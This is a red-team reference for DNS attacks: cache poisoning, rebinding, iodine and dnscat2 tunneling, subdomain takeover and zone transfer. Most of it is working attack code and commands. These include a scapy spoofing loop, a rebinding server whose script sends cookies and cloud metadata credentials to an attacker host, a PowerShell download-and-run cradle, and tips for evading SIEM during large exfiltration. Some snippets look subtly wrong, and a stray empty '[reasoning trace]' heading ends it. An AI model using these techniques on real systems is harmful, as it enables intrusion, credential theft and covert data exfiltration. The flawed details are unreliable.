# dns-attacks — net

# DNS Attacks — Red Team Reference

## 1. Cache Poisoning

### 1.1 Kaminsky Attack (CVE-2008-1447)

**Vector:** Off-path blind spoofing. The attacker forces the resolver to perform a query for a name they control, then floods it with forged responses before the legitimate response arrives. Key: TXID (16 bit) + source port (16 bit) = 32 bits of entropy guessed in parallel.

**What is sent:** Batch of UDP packets to the resolver's ephemeral port, `QR=1`, `AA=1`, `RD=1`, `RA=1`, random `ID`, `QUESTION` matching the queried name, `ANSWER` containing the attacker's A record + `AUTHORITY` NS for the target zone.

**What appears:** The resolver cache stores a forged A record for `ns.target.tld` for the TTL duration. Subsequent queries to the target point to the attacker's IP.

**Why it worked:** Old resolvers (BIND 9.x < 9.4.2-P1, dnsmasq < 2.43, Windows Server 2003 DNS) used a weak PRNG and a locked source port. **Why it fails today:** modern resolvers (BIND 9.18, Unbound 1.19, dnsmasq 2.90) use full port randomization + 0x20 encoding (case randomization on QNAME) → effective entropy 48+ bits.

```bash
# scapy skeleton — batch spoof, 32-bit space
from scapy.all import *
target_resolver = "10.0.0.53"
qname = "ns1.attacker-controlled.tld"
ip_victim = "203.0.113.10"
for txid in range(0, 65536, 1):
    for sport in range(1024, 65535):
        p = IP(src=target_resolver, dst=target_resolver)/UDP(sport=53, dport=sport)/\
            DNS(id=txid, qr=1, aa=1, rd=1, ra=1, qdcount=1, ancount=1,
                qd=DNSQR(qname=qname, qtype="A"),
                an=DNSRR(rrname=qname, type="A", ttl=86400, rdata=ip_victim))
        send(p, verbose=0)
```

**Bailiwick check (the defense that kills this technique):** the resolver only accepts RRs from nameservers authoritative for the zone in which that RR resides. BIND 9.6+ (`dnssec-validation auto`), Unbound (`harden-referral-path: yes`), and Windows DNS 2008+ enforce this. An attacker who inserts an A record for `bank.com` from a response for `evil.attacker.tld` will be rejected.

Detection in the field:
```bash
# fluktuasi NS record mencurigakan
dig +short NS target.tld @8.8.8.8
# bandingkan dengan delegasi otoritatif dari TLD
dig +norecurse NS target.tld @a.gtld-servers.net
```

### 1.2 Bailiwick Bypass via Referral Injection (dangling)

If the resolver does not lock down `in-bailiwick glue`, an attacker controlling the authoritative NS for `sub.attacker.tld` can send a referral to `victim.tld` with a glue `A` record for `ns1.victim.tld`. Unbound < 1.9.0 is vulnerable to this variant before `harden-referral-path` defaults on.

### 1.3 Vulnerable versions (for lab/legacy asset detection)

| Produk | Versi rentan | Fix |
|---|---|---|
| BIND | < 9.4.2-P1 | 9.4.2-P1 (CVE-2008-1447) |
| dnsmasq | < 2.43 | 2.43 |
| Unbound | < 1.0.1 | 1.0.1 |
| Windows DNS Server | 2000/2003 | 2008 R2+ |

---

## 2. DNS Rebinding

**Vector:** The attacker controls a domain (e.g. `rebind.attacker.tld`) with a nameserver that returns two alternating A records: first the attacker's server IP (to serve JS), then the target's internal IP (e.g. `192.168.1.1` or `169.254.169.254`) with a TTL of 0-1 seconds. Browsers (Chrome 131, Firefox 133) use same-origin policy based on hostname, not IP — so the JS keeps running after the A record flips.

**What is sent:** HTML + JS from the attacker IP, then the browser performs a fetch to the same hostname that now resolves to the internal IP.

**What appears:** HTTP requests from the user's browser to internal services (router admin, AWS cloud metadata endpoint `169.254.169.254/latest/meta-data/iam/security-credentials/`, Elasticsearch `:9200`, etc.).

**Why it works:** the browser does not re-resolve DNS per request based on origin IP pinning, only per new connection with the TTL. **Why it fails:** Chrome 131 enforces DNS pinning for up to 60 seconds after first resolution, plus `Private Network Access` (PNA, now `Local Network Access`) blocks public→private requesters without an `Access-Control-Request-Private-Network` preflight. Firefox 132 also enforces PNA. AWS IMDSv2 (default on new instances since 2020) requires a `PUT` + token — kills classic rebinding to metadata.

**Server rebinding minimal (Node.js 22):**
```javascript
const dns = require('dns');
const http = require('http');
const target = '169.254.169.254';
let count = 0;
const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-Type', 'text/html');
  if (count++ % 2 === 0) {
    res.end(`<script>
      fetch('http://rebind.attacker.tld/latest/meta-data/iam/security-credentials/', {mode:'no-cors'})
      .then(()=>fetch('http://rebind.attacker.tld/exfil?d='+document.cookie));
    </script>`);
  } else { res.end('flipped'); }
});
require('dns').resolve4 = (name, cb) => cb(null, count % 2 ? [target] : ['203.0.113.5']);
server.listen(80);
```
*Note: field implementations use an authoritative DNS server with flip logic at layer 53, not a monkeypatch of `dns`.*

**Exfil payload to listener:**
```bash
# listener di attacker
python3 -m http.server 8080 --bind 0.0.0.0
# atau pakai tcpdump untuk lihat request
sudo tcpdump -i any -A 'tcp port 80 and host 203.0.113.5'
```

**Ready-to-use domains (lab):** `rbndr.us`, `1u.ms`, `rebind.it` (public service) — or self-host a nameserver with `dnschef --fakeip 192.168.1.1 --fakedomains rebind.attacker.tld`.

---

## 3. DNS Tunneling

### 3.1 Iodine (versi 0.7.0)

**What is sent:** Data encapsulated in the QNAME and in TXT/NULL/CNAME/SRV responses. Handshake via `TXT` query `z.<version>.tunnel.tld`. Downstream data in `CNAME` or `TXT` chunks; upstream in `A/AAAA` with base32 labels.

**What appears:** UDP/53 traffic to the attacker's authoritative NS (must control the NS for `tunnel.tld`). Bandwidth ~30-300 Kbps depending on loss.

**Setup server (Debian 12, iodine 0.7.0-10):**
```bash
# delegasi: ns1.tunnel.attacker.tld -> IP kamu (NS record + A glue)
apt install iodine
mkdir /run/iodine && chown iodined /run/iodine
iodined -f -c -P 'Str0ngPass!' -n 10.10.0.1 10.10.0.0/24 tunnel.attacker.tld
# -f foreground, -c client subnet check, -n MTU auto, tun device tun0
```

**Client (Windows 11 24H2 — jalankan sebagai Admin, butuh TAP driver):**
```powershell
.\iodine.exe -f -P "Str0ngPass!" 203.0.113.5 tunnel.attacker.tld
# interface baru: 10.10.0.2, gateway 10.10.0.1
```

**Client (Linux):**
```bash
iodine -f -P 'Str0ngPass!' 203.0.113.5 tunnel.attacker.tld
```

**Why it works:** egress UDP/53 is rarely deeply inspected, the payload is encrypted (ChaCha20/password), the authoritative server can be in the public cloud. **Why it fails:**
- the local stub resolver in resolv.conf forwards queries via the recursive (not directly to the NS) → queries run, but responses are not routed back to the client because the recursive resolver does not cache `CNAME` chunks with TTL=0
- DNS dystrophy/rate-limit on the resolver (Cloudflare 1.1.1.1 restricts `iodine` with `NOTIMP` for the NULL type)
- enterprise firewalls with a DNS proxy (Cisco Umbrella, Zscaler) perform `TXT` inspection and block long base32 labels
- MTU fragmentation → `-m 200` on the client for a 1280 IPv6 path MTU

**Blokir:** `iptables -A OUTPUT -p udp --dport 53 -m string --hex-string "|03|v|07|version|" --algo bm -j DROP` (handshake signature).

### 3.2 dnscat2 (Ruby, v0.07)

**What is sent:** CNAME-encoded chunks for downstream, A/TXT queued for upstream. Stealthier than iodine for DPI evasion (no NULL, base32 encoding with a client nonce).

**Server:**
```bash
git clone https://github.com/iagox86/dnscat2 && cd server
gem install bundler && bundle install
ruby ./dnscat2-server tunnel.attacker.tld   # listen 53 UDP/TCP
# NS delegation: tunnel.attacker.tld -> ns1.attacker.tld A <IP kamu>
# console: session -i <id>, shell, download, upload
```

**Client Windows 11 (exec via PowerShell cradle):**
```powershell
# compile dnscat2-powershell (v0.0.4) di dnsrecon leaf, atau:
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/dnscat2.ps1')
Start-Dnscat2 -Domain tunnel.attacker.tld -DNSServer 203.0.113.5
```

**Client Linux (go-dnscat2, v0.6.0 fork):**
```bash
./dnscat2 --dns server=203.0.113.5,port=53,domain=tunnel.attacker.tld --secret=deadbeef
```

**Signature preview for DPI:**
```bash
# log resolver (Unbound), label base32 panjang > 52 char dan TTL 0 = kandidat
sudo tail -f /var/log/unbound.log | grep -E '"\b[a-z0-9]{40,}\.' 
```

**Rate reality:** ~5-40 KB/s downstream, 1-10 KB/s upstream on networks with resolver caching. For exfil > 100 MB, use `--max-packets` chunking + scheduling (off-hours).

---

## 4. Subdomain Takeover — Flow

**Criteria:** a CNAME (or A to `*.cloudfront.net`, `*.herokuapp.com`, `*.s3.amazonaws.com`, `*.azurewebsites.net`, `*.github.io`) pointing to a resource that has already been **deleted/decommissioned** by the provider → dangling record → attacker claims a customer resource with the same name.

### 4.1 Alur deteksi

```bash
# 1. enumerate
subfinder -d target.tld -all -silent -o subs.txt
# 2. resolve CNAME + A
dnsx -l subs.txt -cname -a -resp -silent -o resolved.txt
# 3. deteksi fingerprint 404 provider
cat resolved.txt | grep -Ei 'herokuapp|s3\.amazonaws|cloudfront|azurewebsites|github\.io|shopify|fastly'
```

```bash
# deteksi respons HTTP khas "NoSuchBucket", "There isn't a GitHub Pages site here"
httpx -l subs.txt -silent -title -status-code -match-string "NoSuchBucket,There isn't a GitHub Pages site here,no such app,404 Not Found - nginx,Repository not found"
```

### 4.2 Provider fingerprint (Feb 2025)

| Provider | CNAME target | 404 body | Claim mechanism |
|---|---|---|---|
| AWS S3 | `*.s3.amazonaws.com` | `NoSuchBucket` | bucket name global, `aws s3 mb s3://name` region sesuai bucket lama |
| AWS CloudFront | `*.cloudfront.net` | `The request could not be satisfied` (403, `Bad request` header `x-cache: Error from cloudfront`) | a new distribution cannot take over the name `d111.cloudfront.net` — only takedown |
| Heroku | `*.herokuapp.com` | `No such app` | `heroku create <name>` (nama global) |
| Azure App Service | `*.azurewebsites.net` | `404 Web Site not found` | requires `asuid.<subdomain>` TXT verification → **direct takeover is difficult** since 2021 |
| GitHub Pages | `*.github.io`, `*.github.io.` | `404 There isn't a GitHub Pages site here` | create repo `<user>.github.io` — only if CNAME to a non-existent user account |
| Shopify | `*.myshopify.com` | `Sorry, this shop is currently unavailable` | klaim `myshopify.com` handle |
| Fastly | `*.fastly.net` | `Fastly error: unknown domain` | butuh service ID internal — susah |

### 4.3 Flow takeover S3 (laboratorium)

```bash
# 1. korban punya CNAME: assets.target.tld -> target-assets.s3.amazonaws.com
# 2. bucket dihapus, tapi CNAME masih di DNS target.tld
# 3. klaim bucket (nama harus persis, region us-east-1 default)
aws s3api create-bucket --bucket target-assets --region us-east-1
aws s3api put-bucket-acl --bucket target-assets --acl public-read
echo '<html><body>pwned</body></html>' > index.html
aws s3 cp index.html s3://target-assets/index.html --content-type text/html
# 4. verifikasi
curl -s http://assets.target.tld/ | head
```

**Why it works:** no domain ownership verification at the cloud provider layer — resource name-only. **Why it fails:** modern providers add `TXT _amazonses`, `_acme-challenge` ownership tokens; new AWS CloudFront (post-2023) enforces pending verification cert + TXT. Azure requires `asuid.<sub>` TXT. For S3, if the bucket still exists (victim forgot to delete) → the name is already taken, attacker cannot claim.

### 4.4 Dangling CNAME (varian)

CNAME points to a hostname that **does not resolve at all** (`NXDOMAIN`) but is not a claim-able provider → cannot takeover; only DoS. The attacker could register that apex domain if a registrar/gTLD delegates it (rare, `.s3.amazonaws.com` typo case, `.ngrok.io` sub-namespace).

```bash
# temukan dangling: ada CNAME di zone tapi tidak ada apex di target
for c in $(cat resolved.txt | awk '{print $2}'); do
  if ! dig +short "$c" A | grep -q '.'; then echo "DANGLING: $c"; fi
done
```

---

## 5. Zone Transfer (AXFR)

**Vector:** authoritative DNS server allows `AXFR` from attacker IP (misconfig `allow-transfer { any; }` in BIND, or `zone-transfer` default on in Windows DNS before 2008 R2).

**What is sent:** TCP query `AXFR target.tld` (RFC 5936) to port 53.

**What appears:** Full zone dump — all A, AAAA, MX, TXT, SRV, CNAME, internal IP, service discovery.

```bash
# 1. temukan NS
dig +short NS target.tld
# 2. coba AXFR ke setiap NS
dig AXFR target.tld @ns1.target.tld
# 3. fallback enumerasi
for ns in $(dig +short NS target.tld); do
  echo "== $ns =="; dig AXFR target.tld @"$ns" +noall +answer +time=5
done
```

**Windows DNS on modern domain controller (Server 2022):** `axfr` denied by default unless `Allow zone transfers` is checked. **BIND 9.18** — default `allow-transfer { none; }` since 9.18, `allow-transfer { localhost; }` in old sample config.

**Why it fails in the field:** TSIG requirement (`allow-transfer { key xfer-key; }`), IP allowlist, firewall that only allows AXFR to secondary in RFC1918. If you get `Transfer failed.` or `connection timed out`, check whether the server supports `IXFR` then fall back to enumeration via `dig` per record type.

**Detection:** long `AXFR` query logs from non-secondary IP.
```bash
# Unbound / BIND audit log
grep 'AXFR' /var/log/named/query.log | awk '{print $6}' | sort | uniq -c
```

---

## 6. Operational Pitfalls That Make This Technique Fail in the Field

1. **DNS-over-HTTPS/TLS (DoH/DoT) kills tunneling at the endpoint.** Chrome 131 + Windows 11 24H2 default DoH to Cloudflare if configured; UDP/53 never leaves. Check: `reg query HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters /v EnableAutoDoh`. Bypass via `dnscat2 --dns server=...` does not work if the resolver is DoH — must be via native resolver hijack or SOCKS.

2. **EDNS Client Subnet (ECS) and resolver caching deceive rebinding.** Caching resolver will cache the IP flip and not re-resolve; TTL 0 is often clamped to 60 seconds by Unbound (`cache-min-ttl: 60`). Solution: don't use local `dnsmasq` as client resolver — force client direct-to-auth for rebind.

3. **AXFR only succeeds on drifting secondary NS.** In the lab it works, in production often only TCP/53 allowlist to secondary peer. Scan `nmap -sT -p 53 <ns>` to check TCP; but cloud ingress firewall (AWS SG default) blocks TCP/53 → use UDP first.

4. **Bailiwick + 0x20 are already default in modern resolvers.** Kaminsky is practically dead against Cloudflare 1.1.1.1, Google 8.8.8.8 (use `--randomize-case` + port = random ephemeral, entropy 48+). Still vulnerable: IoT/router appliances, dnsmasq < 2.86 (default in OpenWrt 21.02), MikroTik RouterOS < 7.5, and static internal DNS servers (dnsmasq in container `--port 53` without random `--address`). Focus effort on that segment.

5. **Subdomain takeover fingerprints change.** AWS S3 `NoSuchBucket` can become `AccessDenied` if the bucket exists but policy is private — not a takeover. CloudFront `x-cache: Error from cloudfront` is often a false positive. Always validate with a **claim attempt** in a parallel lab (same `bucket-name` in attacker account) before reporting. Providers patch silently: Heroku since 2021 rejects `heroku create` for names that were ever claimed (reserved 14 days), Azure requires TXT verify → move to another target.

6. **Recursive resolver rate limit kills tunneling.** Cloudflare 1.1.1.1, Google 8.8.8.8 block more than ~150 qps per client IP → tunneling via public resolution fails. Must delegate NS directly from registrar to attacker server, and client must resolve from authoritative (not recursive). Test with `dig @<attacker-NS> tunnel.attacker.tld TXT`.

7. **MTU fragmentation on IPv6 paths.** `iodine` default MTU 1024; networks with PMTUD drop first → `--mtu 200` or `-m 220`. `dnscat2` `--max-packets 1` for small fragments. Symptoms: handshake OK, shell hangs, `ping 10.10.0.1` 100% loss.

8. **SIEM analyzes base32 label patterns.** Label > 52 chars in QNAME, Shannon entropy > 3.5, or TTL 0 on `TXT` = alert in Elastic, Splunk `dns` sourcetype. Use short domains, chunk `A` records (not `TXT`) 20-40 chars, mix with legit queries (browser-like prefetch) — this requires `dnscat2 --max-packets 1` and `--delay 200ms` delay.

9. **DoH to internal resolver bypasses DNS firewall.** Cisco Umbrella Roaming Client on Windows 11 24H2 forces DoH → no UDP/53 egress. Check `Get-DnsClientNrptPolicy`. Bypass: `--dns server=IP,port=53,no-resolv` in iodine and ensure UDP/53 egress is opened to that IP in the local firewall (rare, usually blocked).

10. **Zone transfer query from public IP in logs.** Every AXFR generates a log on the authoritative server; if the target uses Cloudflare DNS (not self-hosted) AXFR is impossible (Cloudflare does not allow it). Ensure the targeted NS is not a second-level proxy.

11. **Rebinding via IPv6.** AAAA flip to `fe80::1` or `fd00::/8` does not pass through PNA correctly in Chrome 131 (bug/feature: IPv6 ULA geo-blocked without `Local Network Access` prompt in 131, fixed in 132). Setting target `127.0.0.1` (loopback) is more reliable for local victim browser, but requires CORS whitelist preflight.

12. **Negative DNS cache TTL.** `dig +ttlunits` output `0s` does not mean it is not cached — `SOA MINIMUM` determines the negative TTL. For rebind, set apex SOA `MINIMUM 1` and authoritative AS record `TTL 0`; resolvers may still clamp.

---

## [reasoning trace]


